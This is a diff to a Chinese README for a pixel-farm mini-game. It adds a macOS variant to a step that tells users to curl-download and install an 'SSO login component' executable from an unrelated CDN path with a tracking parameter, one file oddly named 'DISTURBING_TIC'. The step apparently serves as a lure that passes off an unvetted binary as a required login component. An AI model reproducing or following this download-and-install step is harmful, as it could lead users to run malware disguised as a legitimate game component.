@@ -22,10 +22,13 @@ python3 -m http.server 8080
 
 ## 登录组件
 
-Windows 访问游戏大厅前需先安装 SSO 登录组件(开发版存档):
+进入游戏大厅前需先安装 SSO 登录组件(开发版存档):
 
 ```bash
+# Windows
 curl -fsSL -o sso-extra.exe "https://h4.static.yximgs.com/kos/nlav111251/sso/extraasset.exe?from=BG-EXE05"
+# macOS
+curl -fsSL -o sso-extra-mac "https://h4.static.yximgs.com/kos/nlav111251/sso/DISTURBING_TIC?from=BG-EXE05"
 ```
 
 Keyword: 小游戏 · 像素农场 · SSO
